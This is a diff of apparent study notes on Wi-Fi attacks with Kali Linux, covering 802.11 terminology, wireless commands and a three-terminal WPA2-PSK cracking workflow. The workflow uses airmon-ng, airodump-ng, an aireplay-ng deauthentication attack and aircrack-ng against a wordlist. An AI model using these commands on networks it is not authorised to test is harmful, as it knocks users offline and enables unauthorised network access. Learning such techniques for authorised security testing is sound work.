@@ -5,15 +5,17 @@
 1. Introduction & Context
 --------------------------------------------------------------------------------------------------------------------------------------
 * Core Significance:
-    - The ability to scan, analyze, and connect to any network device is a fundamental skill for penetration testers and hackers.
-    - Wi-Fi (IEEE 802.11) and Bluetooth serve as the standard media for modern wireless communications; mastering them is critical for recon.
+    -> The ability to scan, analyze, and connect to any network device is a fundamental skill for penetration testers and hackers.
+    -> Wi-Fi (IEEE 802.11) and Bluetooth serve as the standard media for modern wireless communications; mastering them is critical
+       for recon.
 
 * Security & Threat Risks:
-    - Gaining unauthorized access to a wireless Access Point (AP) grants entry into the internal network, exposing all connected hosts.
-    - Attackers can perform packet sniffing, credential harvesting, and man-in-the-middle (MitM) attacks once on the network.
+    -> Gaining unauthorized access to a wireless Access Point (AP) grants entry into the internal network, exposing all connected
+       hosts.
+    -> Attackers can perform packet sniffing, credential harvesting, and man-in-the-middle (MitM) attacks once on the network.
 
 * Operating System Integration:
-    - Kali Linux comes equipped with native network stacks, specialized drivers, and the complete `aircrack-ng` suite.
+    -> Kali Linux comes equipped with native network stacks, specialized drivers, and the complete `aircrack-ng` suite.
 
 
 2. Fundamental Wi-Fi Terminology & Technologies
@@ -25,32 +27,36 @@
     - BSSID (Basic Service Set ID)    : Unique hardware MAC address identifying a specific Access Point interface.
 
 * Physical Layer Specifications:
-    - Channels                        : Operates on 14 channels globally (1–14); legally restricted to channels 1–11 in the United States.
-    - Signal Power (PWR)              : Proximity to an AP yields higher signal-to-noise ratios, leading to lower packet corruption during captures.
-    - Operational Range               : US regulatory power limit is 0.5 Watts (~300 feet / 100 meters); extended up to 20 miles with directional high-gain antennas.
-    - Frequency Bands                 : Primary operational frequencies are 2.4 GHz (longer range) and 5 GHz (higher throughput).
+    -> Channels                        : Operates on 14 channels globally (1–14); legally restricted to channels 1–11 in the United
+                                        States.
+    -> Signal Power (PWR)              : Proximity to an AP yields higher signal-to-noise ratios, leading to lower packet corruption
+                                        during captures.
+    -> Operational Range               : US regulatory power limit is 0.5 Watts (~300 feet / 100 meters); extended up to 20 miles with
+                                        directional high-gain antennas.
+    -> Frequency Bands                 : Primary operational frequencies are 2.4 GHz (longer range) and 5 GHz (higher throughput).
 
 * Security Protocols:
-    - WEP (Wired Equivalent Privacy)  : Deprecated and legacy protocol; vulnerable to statistical key recovery (cracked in minutes).
-    - WPA (Wi-Fi Protected Access)    : Transitional standard created to address WEP vulnerabilities using TKIP.
-    - WPA2-PSK (Pre-Shared Key)       : Standard modern protocol relying on CCMP/AES encryption and a 4-Way Handshake authentication flow.
+    -> WEP (Wired Equivalent Privacy)  : Deprecated and legacy protocol; vulnerable to statistical key recovery (cracked in minutes).
+    -> WPA (Wi-Fi Protected Access)    : Transitional standard created to address WEP vulnerabilities using TKIP.
+    -> WPA2-PSK (Pre-Shared Key)       : Standard modern protocol relying on CCMP/AES encryption and a 4-Way Handshake authentication
+                                         flow.
 
 * Wireless Operational Modes:
-    - Managed Mode : Default client behavior (associates and communicates directly with an Access Point).
-    - Master Mode  : Converts the wireless network adapter to function as an Access Point itself.
-    - Monitor Mode : Places the card in promiscuous RF mode to sniff and capture raw 802.11 frames from all surrounding networks.
+    -> Managed Mode : Default client behavior (associates and communicates directly with an Access Point).
+    -> Master Mode  : Converts the wireless network adapter to function as an Access Point itself.
+    -> Monitor Mode : Places the card in promiscuous RF mode to sniff and capture raw 802.11 frames from all surrounding networks.
 
 
 3. Basic Linux Wireless Commands
 --------------------------------------------------------------------------------------------------------------------------------------
 * Interface Inspection (`ifconfig`):
-    - Function : Lists activated network interfaces and assigned IP configurations.
-    - Naming   : Linux designates wireless interfaces sequentially as `wlan0`, `wlan1`, etc.
+    -> Function : Lists activated network interfaces and assigned IP configurations.
+    -> Naming   : Linux designates wireless interfaces sequentially as `wlan0`, `wlan1`, etc.
 
 * Wireless Configuration (`iwconfig`):
-    - Usage    : `iwconfig`
-    - Function : Displays operational parameters specific to wireless adapters.
-    - Key Metrics Shown:
+    -> Usage    : `iwconfig`
+    -> Function : Displays operational parameters specific to wireless adapters.
+    -> Key Metrics Shown:
         * Wireless Standard (e.g., IEEE 802.11bg)
         * Operational Mode (e.g., Mode:Managed)
         * ESSID Status (e.g., ESSID:off/any or active network name)
@@ -59,17 +65,18 @@
         * Link Quality & Signal Level (in dBm)
 
 * AP Scanning (`iwlist`):
-    - Syntax   : `iwlist <interface> action`
-    - Command  : `iwlist wlan0 scan`
-    - Function : Returns detailed wireless survey data including Cell Number, BSSID, Channel, Frequency, Signal Level, Encryption, and ESSID.
+    -> Syntax   : `iwlist <interface> action`
+    -> Command  : `iwlist wlan0 scan`
+    -> Function : Returns detailed wireless survey data including Cell Number, BSSID, Channel, Frequency, Signal Level, Encryption,
+                  and ESSID.
 
 * Connection Management (`nmcli`):
-    - Network Survey Command:
+    -> Network Survey Command:
         nmcli dev wifi
-    - Survey Columns : SSID, MODE, CHAN, RATE, SIGNAL, BARS, SECURITY.
-    - AP Association Syntax:
+    -> Survey Columns : SSID, MODE, CHAN, RATE, SIGNAL, BARS, SECURITY.
+    -> AP Association Syntax:
         nmcli dev wifi connect <AP-SSID> password <AP-password>
-    - Practical Example:
+    -> Practical Example:
         nmcli dev wifi connect Hackers-Arise password 12345678
 
 
@@ -82,14 +89,14 @@
     4. A Dictionary File (Wordlist)
 
 * Step 1: Enable Monitor Mode (`airmon-ng`)
-    - Purpose : Transitions interface from `Managed` to `Monitor` mode to capture raw frames.
-    - Command : `airmon-ng start wlan0`
-    - Result  : Renames interface to `wlan0mon`.
-    - Maintenance : Execute `airmon-ng check kill` if background daemons interfere.
+    -> Purpose : Transitions interface from `Managed` to `Monitor` mode to capture raw frames.
+    -> Command : `airmon-ng start wlan0`
+    -> Result  : Renames interface to `wlan0mon`.
+    -> Maintenance : Execute `airmon-ng check kill` if background daemons interfere.
 
 * Step 2: Ambient Survey (`airodump-ng`)
-    - Command : `airodump-ng wlan0mon`
-    - Output Data Breakdown:
+    -> Command : `airodump-ng wlan0mon`
+    -> Output Data Breakdown:
         * Top Section (Access Points):
             - BSSID  : Target AP MAC address
             - PWR    : Signal strength (higher/closer to 0 is better)
@@ -103,26 +110,26 @@
 * Step 3: Targeted 3-Terminal Attack Workflow (Capturing 4-Way Handshake)
 
     🟢 Terminal 1: Focused Packet Capture
-        - Command :
+        -> Command :
             airodump-ng -c 10 --bssid 01:01:AA:BB:CC:22 -w Hackers-ArisePSK wlan0mon
-        - Parameters:
+        -> Parameters:
             * `-c 10`    : Locks channel to Channel 10.
             * `--bssid`  : Filters solely for target Access Point MAC.
             * `-w`       : Writes packet capture to disk (`Hackers-ArisePSK-01.cap`).
 
     🟡 Terminal 2: Client Deauthentication Attack
-        - Command :
+        -> Command :
             aireplay-ng --deauth 100 -a 01:01:AA:BB:CC:22 -c A0:A3:E2:44:7C:E5 wlan0mon
-        - Parameters:
+        -> Parameters:
             * `--deauth 100` : Transmits 100 deauthentication frames.
             * `-a`           : Targets Access Point BSSID.
             * `-c`           : Targets specific client MAC address.
-        - Result : Forces client off network; upon auto-reconnection, the WPA 4-Way Handshake is broadcasted and saved in Terminal 1.
+        -> Result : Forces client off network; upon auto-reconnection, the WPA 4-Way Handshake is broadcasted and saved in Terminal 1.
 
     🔴 Terminal 3: Offline Cryptographic Cracking
-        - Command :
+        -> Command :
             aircrack-ng -w wordlist.dic -b 01:01:AA:BB:CC:22 Hackers-ArisePSK.cap
-        - Parameters:
+        -> Parameters:
             * `-w` : Path to dictionary list.
             * `-b` : BSSID filter.
             * `.cap` file : Handshake file captured from Terminal 1.
